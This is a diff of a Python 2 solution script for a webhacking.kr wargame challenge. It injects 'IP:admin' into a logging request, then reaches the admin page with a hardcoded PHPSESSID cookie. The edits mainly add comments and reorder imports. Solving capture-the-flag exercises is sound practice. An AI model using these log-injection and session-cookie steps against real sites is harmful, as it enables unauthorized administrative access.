@@ -1,9 +1,9 @@
 #-*- coding: utf-8 -*-
+import urllib
 import urllib2
 import CookieManager
-import urllib
-httpConnection = None
 
+# Get IP Address
 ipAddress = ""
 httpConnection = None
 print "[+] Find IP Address"
@@ -18,6 +18,7 @@ finally:
     if httpConnection != None:
         httpConnection.close()
 
+# Logging My Information
 challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-9/index.php"
 parameter = urllib.urlencode({
     "id": ipAddress+":admin"
@@ -37,6 +38,7 @@ finally:
     if httpConnection != None:
         httpConnection.close()
 
+# Login Administrator
 challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-9/admin.php"
 CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
 httpRequest = urllib2.Request(challengeUrl)
